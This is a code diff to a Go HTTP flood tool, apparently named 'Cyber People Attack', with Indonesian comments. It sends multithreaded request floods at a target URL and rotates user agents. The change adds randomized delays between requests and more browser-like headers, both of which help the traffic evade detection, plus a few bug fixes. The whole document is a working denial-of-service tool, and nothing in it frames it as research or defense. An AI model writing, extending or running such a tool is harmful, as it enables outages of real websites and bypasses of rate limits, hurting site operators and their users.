@@ -31,7 +31,7 @@ const banner = `
   ██║     ██╔═══╝ ██╔══██║
   ╚██████╗██║     ██║  ██║
    ╚═════╝╚═╝     ╚═╝  ╚═╝
-     Cyber Poeple Attack
+     CYBER PEOPLE ATTACK
 `
 
 var (
@@ -41,15 +41,17 @@ var (
 )
 
 type AttackConfig struct {
-	TargetURL   string
-	Method      string
-	Threads     int
-	Duration    int
-	NumRequests int
-	Timeout     int
-	Insecure    bool
-	NoColor     bool
-	Silent      bool
+	TargetURL    string
+	Method       string
+	Threads      int
+	Duration     int
+	NumRequests  int
+	Timeout      int
+	Insecure     bool
+	NoColor      bool
+	Silent       bool
+	DelayMin     int // Delay minimal dalam milidetik
+	DelayMax     int // Delay maksimal dalam milidetik
 }
 
 var userAgents = []string{
@@ -58,6 +60,7 @@ var userAgents = []string{
 	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
 }
 
 func createHTTPClient(timeout int, insecure bool) *http.Client {
@@ -78,6 +81,18 @@ func createHTTPClient(timeout int, insecure bool) *http.Client {
 
 func getRandomUserAgent() string {
 	return userAgents[rand.Intn(len(userAgents))]
+}
+
+// Fungsi untuk mendapatkan delay random (dalam milidetik)
+func getRandomDelay(minMs, maxMs int) time.Duration {
+	if minMs <= 0 && maxMs <= 0 {
+		return 0
+	}
+	if minMs == maxMs {
+		return time.Duration(minMs) * time.Millisecond
+	}
+	delayMs := minMs + rand.Intn(maxMs-minMs+1)
+	return time.Duration(delayMs) * time.Millisecond
 }
 
 func sendRequest(client *http.Client, targetURL, methodType string) (int, error) {
@@ -118,6 +133,7 @@ func sendRequest(client *http.Client, targetURL, methodType string) (int, error)
 	req.Header.Set("User-Agent", getRandomUserAgent())
 	req.Header.Set("Accept", "*/*")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Cache-Control", "no-cache")
 
@@ -157,6 +173,14 @@ func worker(client *http.Client, config *AttackConfig, wg *sync.WaitGroup, stop 
 						RED, statusCode, RESET)
 				}
 			}
+
+			// Random delay setelah mengirim request
+			if config.DelayMin > 0 || config.DelayMax > 0 {
+				delay := getRandomDelay(config.DelayMin, config.DelayMax)
+				if delay > 0 {
+					time.Sleep(delay)
+				}
+			}
 		}
 	}
 }
@@ -171,7 +195,10 @@ func printStats(stopStats chan struct{}, noColor, silent bool) {
 			elapsed := time.Since(startTime).Seconds()
 			sent := atomic.LoadInt64(&requestsSent)
 			failed := atomic.LoadInt64(&requestsFailed)
-			rps := float64(sent) / elapsed
+			var rps float64
+			if elapsed > 0 {
+				rps = float64(sent) / elapsed
+			}
 
 			if !silent {
 				if !noColor {
@@ -195,16 +222,19 @@ func runAttack(config *AttackConfig) {
 
 	if !config.Silent {
 		fmt.Printf("%s⚠️  CPA Attack Started ⚠️%s\n", RED, RESET)
-		fmt.Printf("   Target  : %s\n", config.TargetURL)
-		fmt.Printf("   Method  : %s\n", config.Method)
-		fmt.Printf("   Threads : %d\n", config.Threads)
+		fmt.Printf("   Target   : %s\n", config.TargetURL)
+		fmt.Printf("   Method   : %s\n", config.Method)
+		fmt.Printf("   Threads  : %d\n", config.Threads)
 		if config.Duration > 0 {
-			fmt.Printf("   Duration: %ds\n", config.Duration)
+			fmt.Printf("   Duration : %ds\n", config.Duration)
 		}
 		if config.NumRequests > 0 {
-			fmt.Printf("   Requests: %d\n", config.NumRequests)
+			fmt.Printf("   Requests : %d\n", config.NumRequests)
 		}
-		fmt.Printf("   Timeout : %ds\n", config.Timeout)
+		fmt.Printf("   Timeout  : %ds\n", config.Timeout)
+		if config.DelayMin > 0 || config.DelayMax > 0 {
+			fmt.Printf("   Delay    : %d-%d ms\n", config.DelayMin, config.DelayMax)
+		}
 		fmt.Println()
 	}
 
@@ -252,7 +282,7 @@ func runAttack(config *AttackConfig) {
 				if !config.Silent {
 					fmt.Printf("\n%s⚠️  Interrupted by user.%s\n", RED, RESET)
 				}
-				break
+				return
 			default:
 			}
 			time.Sleep(100 * time.Millisecond)
@@ -274,7 +304,10 @@ func runAttack(config *AttackConfig) {
 	elapsed := time.Since(startTime).Seconds()
 	sent := atomic.LoadInt64(&requestsSent)
 	failed := atomic.LoadInt64(&requestsFailed)
-	rps := float64(sent) / elapsed
+	var rps float64
+	if elapsed > 0 {
+		rps = float64(sent) / elapsed
+	}
 
 	if !config.Silent {
 		fmt.Printf("\n%s========== CPA FINAL REPORT ==========%s\n", CYAN, RESET)
@@ -285,6 +318,9 @@ func runAttack(config *AttackConfig) {
 		fmt.Printf("   Failed   : %d\n", failed)
 		fmt.Printf("   Success  : %d\n", sent-failed)
 		fmt.Printf("   Avg RPS  : %.2f\n", rps)
+		if config.DelayMin > 0 || config.DelayMax > 0 {
+			fmt.Printf("   Delay    : %d-%d ms\n", config.DelayMin, config.DelayMax)
+		}
 		fmt.Printf("%s======================================%s\n\n", CYAN, RESET)
 	} else {
 		fmt.Printf("CPA finished: %d requests, %.2f RPS\n", sent, rps)
@@ -304,7 +340,7 @@ func showMethods() {
 
 %s📝 USAGE EXAMPLE:%s
   ./cpa -target https://example.com -method flood -threads 50 -duration 60
-  ./cpa -target https://example.com -method https -threads 100 -requests 5000
+  ./cpa -target https://example.com -method https -threads 100 -delay-min 100 -delay-max 500
 
 `, CYAN, RESET, YELLOW, RESET)
 }
@@ -321,6 +357,8 @@ func main() {
 	insecure := flag.Bool("insecure", true, "Skip TLS verification")
 	noColor := flag.Bool("no-color", false, "Disable colored output")
 	silent := flag.Bool("silent", false, "Silent mode (no output except final)")
+	delayMin := flag.Int("delay-min", 0, "Minimum delay between requests (milliseconds)")
+	delayMax := flag.Int("delay-max", 0, "Maximum delay between requests (milliseconds)")
 	showHelp := flag.Bool("help", false, "Show help")
 	listMethods := flag.Bool("methods", false, "Show attack methods")
 
@@ -337,6 +375,17 @@ func main() {
 		flag.PrintDefaults()
 		showMethods()
 		return
+	}
+
+	// Validasi delay
+	if *delayMin < 0 {
+		*delayMin = 0
+	}
+	if *delayMax < 0 {
+		*delayMax = 0
+	}
+	if *delayMin > *delayMax && *delayMax > 0 {
+		*delayMin, *delayMax = *delayMax, *delayMin
 	}
 
 	validMethods := map[string]bool{
@@ -357,15 +406,17 @@ func main() {
 	}
 
 	config := &AttackConfig{
-		TargetURL:   *target,
-		Method:      *method,
-		Threads:     *threads,
-		Duration:    *duration,
-		NumRequests: *requests,
-		Timeout:     *timeout,
-		Insecure:    *insecure,
-		NoColor:     *noColor,
-		Silent:      *silent,
+		TargetURL:    *target,
+		Method:       *method,
+		Threads:      *threads,
+		Duration:     *duration,
+		NumRequests:  *requests,
+		Timeout:      *timeout,
+		Insecure:     *insecure,
+		NoColor:      *noColor,
+		Silent:       *silent,
+		DelayMin:     *delayMin,
+		DelayMax:     *delayMax,
 	}
 
 	runAttack(config)
